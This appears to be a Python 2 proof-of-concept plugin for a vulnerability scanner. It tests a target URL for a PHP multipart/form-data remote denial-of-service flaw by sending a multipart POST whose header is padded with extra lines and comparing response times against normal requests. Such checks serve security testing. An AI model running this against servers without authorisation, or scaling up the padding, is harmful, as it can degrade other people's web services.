# coding=utf-8
'''
php_multipart_dos.py
'''
import sys
from LogManager import log
from teye_poc.PocScan import PocScan
from misc.common import rand_letters
from teye_web.http.URL import URL
from wCurl import wcurl
import time
import datetime
import socket
import requests
import httplib

httplib.HTTPConnection.debuglevel = 0


class php_multipart_dos(PocScan):
    def __init__(self):
        '''
		'''
        self._poc_info = {
            'w_hat': {
                'author': "imiyoo",
                'blog': "http://www.imiyoo.com",
                'team': "W.A.T",
                'create_time': "2015-05-15"
            },
            'w_vul': {
                'id': u"WID-2015-1002",
                'title': u"PHP multipart/form-data 远程DOS漏洞",
                'method': u"POST",
                'tag': u"php",
                'rank': u"高危",
                'info': u"http://www.watscan.com/"
            }
        }
        self._linenum = 10
        self._data_type = ["normal", "payload"]

    def check(self, url):
        '''
		'''
        log.info(u"正在检测目标是否存在:[%s]..." % self.get_title())
        url_domain = url.get_domain_url()
        a = self.get_res_time(url_domain, type="payload")
        b = self.get_res_time(url_domain, type="normal")
        c = self.get_res_time(url_domain, type="normal")
        print a, b, c
        if a > b and abs(a - b) > 2 * abs(b - c):
            # security_hole(domain)
            print url_domain

    def _gen_payload(self):
        '''
		'''
        payload = ""
        for i in xrange(self._linenum):
            payload += "a" * self._linenum + "\n"

        return payload

    def _gen_testdata(self, data):
        '''
		'''
        plen = len(data)
        return rand_letters(plen)

    def get_post_data(self, type="normal"):
        '''
		'''
        fuzzdata = self._gen_payload()
        testdata = self._gen_testdata(fuzzdata)
        postdata = ""
        postdata += "--5b4729970b854f95b01a01a2e799996f\r\n"
        if type == "normal":
            postdata += "Content-Disposition: form-data; name=\"filename\"; filename=\"test.txt\"\r\n\r\n"
            postdata += testdata + "just for a test!\r\n\r\n"
        else:
            postdata += "Content-Disposition: form-data; name=\"filename\"; filename=\"test.txt\"" + fuzzdata + "\r\n\r\n"
            postdata += "just for a test!\r\n\r\n"
        postdata += "--5b4729970b854f95b01a01a2e799996f--"
        print len(postdata)
        return postdata

    def get_res_time(self, url, type="normal"):
        headers = {"Content-Type": "multipart/form-data; boundary=5b4729970b854f95b01a01a2e799996f"}
        data = self.get_post_data(type)
        res = requests.post(url, headers=headers, data=data)
        return res.elapsed

    def get_class_name(self):
        return self.__class__.__name__


if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit()
    target = sys.argv[1]
    print "Scanning Target======>%s" % (target)
    urlobj = URL(target)
    p = php_multipart_dos()
    p.check(urlobj)
